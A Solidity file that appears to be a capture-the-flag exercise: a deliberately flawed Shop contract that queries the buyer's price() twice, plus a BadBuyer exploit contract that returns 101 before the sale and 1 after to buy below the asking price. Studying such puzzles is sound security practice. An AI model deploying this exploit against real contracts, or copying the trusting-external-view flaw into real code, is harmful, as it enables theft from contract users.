// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

/**
 * 您能在商店以低于要求的价格购买到商品吗？
 * 1.shop合约预计由买家使用
 * 2.了解view函数的限制
 *
 */
contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract BadBuyer is Buyer {

    address public shop;

    constructor(address _shop) {
        shop = _shop;
    }

    function price() external view override returns (uint256) {
        uint256 priceNum = 101;
        bytes memory res;
        (, res) = shop.staticcall(abi.encodeWithSignature("isSold()"));
        if (uint8(res[31]) == 1) {
            priceNum = 1;
        }
        return priceNum;
    }

    function buy() public {
        Shop(shop).buy();
    }
}
